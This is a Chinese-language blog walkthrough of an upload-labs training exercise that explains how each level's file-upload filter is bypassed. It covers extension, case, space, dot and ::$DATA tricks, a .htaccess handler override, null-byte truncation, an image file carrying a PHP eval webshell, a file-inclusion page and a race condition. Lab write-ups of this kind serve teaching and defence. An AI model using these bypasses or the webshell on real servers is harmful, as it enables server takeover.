<p><img src="https://img-blog.csdnimg.cn/ebd42d74095f4bb29ba6e83b309fe05b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-03-黑名单验证"><a href="#Pass-03-黑名单验证" class="headerlink" title="Pass-03 黑名单验证"></a>Pass-03 黑名单验证</h1><p>尝试上传php文件，结合源码我们可以看出这关设置了文件后缀名黑名单，禁止上传后缀名为php的文件</p>
<p><img src="https://img-blog.csdnimg.cn/9cbf1c0484604c5e9cb5e51dde0ac86f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/a605ae7a569d4ba68947d33731d7c414.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们尝试通过扩展名绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php1 .php4 .pht </span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/fd470206681145a1a311a418cdb990f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这句话的意思是可以 .phtml .phps 等后缀名的文件执行 php程序</p>
<p>我们上传1.phtml 文件</p>
<p><img src="https://img-blog.csdnimg.cn/e7b58bb9b59c42a3a9255e21e49046e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>上传成功</p>
<p>尝试使用蚁剑连接</p>
<h1 id="Pass-04-黑名单验证-htaccess"><a href="#Pass-04-黑名单验证-htaccess" class="headerlink" title="Pass-04 黑名单验证.htaccess"></a>Pass-04 黑名单验证.htaccess</h1><p>分析源码：我们发现这一关的过滤比第三过更多了，使用第三关的方法是行不通了。</p>
<p>但是没有限制 .htaccess</p>
<p>补充知识：</p>
<p>​    .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>​    上传内容为一下代码的文件，双引号内为你要上传的文件名。</p>
<blockquote>
<p>&lt;FilesMatch “jpg”&gt;<br>     SetHandler application/x-httpd-php<br> </p>
</blockquote>
<p>​    但是这个后缀名使用的前提是我们要在<code>apache</code>的<code>httpd.conf</code>中将<code>LoadModule rewrite_module modules/mod_rewrite.so</code>打开还有<code>AllowOverride All    </code></p>
<p><img src="https://img-blog.csdnimg.cn/241f4e676e4b45aa809a7ad85d1f275b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们先上传 .htaccess 成功后再上传 .jpg文件</p>
<h1 id="Pass-05大小写绕过"><a href="#Pass-05大小写绕过" class="headerlink" title="Pass-05大小写绕过"></a>Pass-05大小写绕过</h1><p>我们尝试上传 .hatccess 文件，但提示 “此文件类型不允许上传！” 说明过滤了该文件。</p>
<p>我们查看源码：</p>
<p><img src="https://img-blog.csdnimg.cn/91bc82f9f6284916a7f6a9d9c54fa8fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 分析发现</p>
<p>第五关比第四关少了strtolower，这说明我们可以尝试大小写绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>上传 .Php 文件，发现上传成功。</p>
<p><img src="https://img-blog.csdnimg.cn/369b883dcf6b4ef5899da6f2675a8e2c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6 空格绕过"></a>Pass-6 空格绕过</h1><p>分析源码：</p>
<p>发现本关相比较前两关少了一步首尾去空的步骤，这样的话我们可以采取空格绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/2d6a07c7e7934d70a656312bb58c7bae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们上传 .php (点+php+空格) 的文件，上传成功。</p>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h1><p>分析源码：</p>
<p>相比较前几关，本关少了一下一步，这样的话就可以考虑从这里入手。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。</p>
<p><img src="https://img-blog.csdnimg.cn/fb218d6312214ae9aba975b3f15bf451.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="-1"><a href="#-1" class="headerlink" title></a></h1><h1 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08 ::$DATA绕过"></a>Pass-08 ::$DATA绕过</h1><p>分析本关源码：</p>
<p>我们会发现本关少了去除字符串的一步，这里将是我们的入手点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/a99a7b8c536943868e39ee303c32f7c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>​    在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过。</p>
<h1 id="Pass-09-点-空格-点-空格绕过"><a href="#Pass-09-点-空格-点-空格绕过" class="headerlink" title="Pass-09 点+空格+点+空格绕过"></a>Pass-09 点+空格+点+空格绕过</h1><p>分析源码：</p>
<p>​    先将首尾去空，又去除了<code>::$DATA</code>又转换为小写，再删去末尾的点。这样一来我们构造文件名，使其经过过滤后得到的还是<code>php</code>的文件名不就行了，所以就<code>1.php. .</code> 就可以绕过，也就是<code>点+空格+点+空格</code>绕过</p>
<p><img src="https://img-blog.csdnimg.cn/37d1de5b9f6e4e28ab99232e7bfc5580.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="-2"><a href="#-2" class="headerlink" title></a></h1><h1 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h1><p>​    在分析源码前，我们可以不断地的通过burpsuite抓包模拟发送头信息，然后分析返回信息进行判断。</p>
<p>分析源码：</p>
<p>我们发现这里是将违规的后缀名全部替换成了空，但是他只替换一次，我们可以采用双写绕过。</p>
<p>比如 .php -&gt; .pphphp</p>
<p><img src="https://img-blog.csdnimg.cn/78796c39c1ec406486ef09c177b41d60.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们上传的文件名为： 10.pphphp </p>
<p>我们查看图片连接，会发现后缀名为 .php</p>
<p><img src="https://img-blog.csdnimg.cn/4989c126762b4cebb821615537b0af49.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 00截断"></a>Pass-11 00截断</h1><p>分析源码：</p>
<p>白名单判断</p>
<p>但是$img_path这个变量直接是拼接的，所以我们可以使用<code>%00</code>截断绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><code>%00</code>截断的条件是</p>
<blockquote>
<p><code>php</code>版本要小于5.3.4 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为<code>OFF</code>状态</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/fd0ed2c905c8410395345d1b9bd59344.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 修改save_path 路径，最后使用 %00 截断</p>
<p><img src="https://img-blog.csdnimg.cn/729e555cf1b34077a5b6c788284c7452.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12 00截断"></a>Pass-12 00截断</h1><p>分析源码：</p>
<p><img src="https://img-blog.csdnimg.cn/558ff87a68824415ac9f5e432b1e29bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 用burp抓包，发现就是save_path post传参</p>
<p>用POST方式传参，应该也是<code>00</code>截断,但是不会像GET方式那样会对%00进行解码。</p>
<p>由于无法自行解码所以我们需要在<code>hex</code>中找到相对应的位置将数字修改为00</p>
<h1 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13 图片马绕过"></a>Pass-13 图片马绕过</h1><p>分析源码：  $bin = fread($file, 2); //只读2字节</p>
<p>通过读取两个字节来确定文件类型，所以直接制作图片马即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type == &#x27;unknown&#x27;)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>13.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后上传，但是直接访问并不能将<code>gif</code>当作<code>php</code>来解析,因此还需要利用文件包含漏洞</p>
<p>写一个<code>13.php</code>传入，再利用它来解析图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##include.php</span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>再结合文件包含解析利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload/include.php?file=upload/图片名称</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14 getimagesize()-图片马"></a>Pass-14 getimagesize()-图片马</h1><p>分析源码：</p>
<p><img src="https://img-blog.csdnimg.cn/c9e46cfdb2aa41f2a59fc8eafbf42158.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这一关通过getimagesize函数来获取图片信息，同样可以使用图片码绕过。</p>
<p><img src="https://img-blog.csdnimg.cn/9e8243a1b57e42d7bca8b02cd6638cdd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>分析源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //需要开启php_exif模块</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    if(!$res)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13</p>
<h1 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h1><p>本人菜鸟请参考以下文章：</p>
<p><a href="https://xz.aliyun.com/t/2657#toc-13">请参考这篇文章</a></p>
<p> 分析源码：</p>
<p>​    判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h1><p>分析源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>​    这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。</p>
